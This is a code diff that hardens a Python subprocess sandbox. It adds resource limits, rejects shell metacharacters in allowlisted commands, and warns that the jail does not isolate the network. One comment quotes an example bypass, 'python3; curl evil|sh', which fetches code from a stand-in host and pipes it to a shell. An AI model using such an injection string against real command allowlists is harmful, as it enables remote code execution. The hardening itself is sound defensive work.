@@ -241,6 +241,14 @@ def _jail_preexec() -> None:
 
         resource.setrlimit(resource.RLIMIT_AS, (JAIL_MAX_AS_BYTES, JAIL_MAX_AS_BYTES))
         resource.setrlimit(resource.RLIMIT_CPU, (JAIL_MAX_CPU_SECONDS, JAIL_MAX_CPU_SECONDS))
+        try:
+            resource.setrlimit(resource.RLIMIT_NPROC, (64, 64))
+        except Exception:
+            pass
+        try:
+            resource.setrlimit(resource.RLIMIT_FSIZE, (64 * 1024 * 1024, 64 * 1024 * 1024))
+        except Exception:
+            pass
     except Exception:
         pass
 
@@ -249,17 +257,22 @@ def check_allowlist(command: str, allowlist: str) -> None:
     """Enforce an optional comma-separated binary-prefix allowlist.
 
     Empty allowlist = no restriction (approval gate still applies).
-    Otherwise the command must start with one of the prefixes, else
-    ``SandboxError``. Best-effort for shell strings — the approval gate
-    remains the primary control.
+    Otherwise the command must start with one of the prefixes AND must not
+    contain shell metachars that would escape the prefix (``;|&$`>\\n``).
+    Best-effort for shell strings — the approval gate remains primary.
     """
     prefixes = [p.strip() for p in (allowlist or "").split(",") if p.strip()]
     if not prefixes:
         return
-    if not any(command.strip().startswith(p) for p in prefixes):
+    stripped = command.strip()
+    if not any(stripped.startswith(p) for p in prefixes):
         raise SandboxError(
             f"command not in allowlist (must start with one of: {', '.join(prefixes)})"
         )
+    # Prefix match alone is bypassable (e.g. "python3; curl evil|sh").
+    # When an allowlist is configured, reject shell metachars outright.
+    if any(c in stripped for c in (";", "|", "&", "$", "`", "\n", ">", "<")):
+        raise SandboxError("command contains shell metachars rejected under allowlist")
 
 
 class SubprocessJail:
@@ -286,7 +299,14 @@ class SubprocessJail:
         Mirrors the ``DockerSandbox.run`` envelope (``network``, ``image`` are
         accepted for backend-swap compatibility but have no effect here: the
         jail inherits the host network and manages no images).
+        Callers must treat network=False as NOT isolated on this backend.
         """
+        import logging as _logging
+
+        if not network:
+            _logging.getLogger(__name__).warning(
+                "SubprocessJail inherits host network; network=False is not isolated"
+            )
         settings = get_settings()
         timeout = timeout_seconds or settings.max_execution_time_seconds
         if isinstance(command, list):
